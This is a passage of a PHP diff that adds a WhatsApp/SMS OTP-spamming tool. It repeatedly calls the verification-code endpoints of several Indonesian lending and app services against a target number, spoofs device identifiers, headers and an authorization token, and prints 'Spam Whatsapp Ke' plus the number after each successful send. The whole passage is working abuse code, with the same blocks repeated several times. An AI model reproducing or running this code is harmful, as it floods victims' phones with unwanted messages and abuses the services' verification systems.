+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
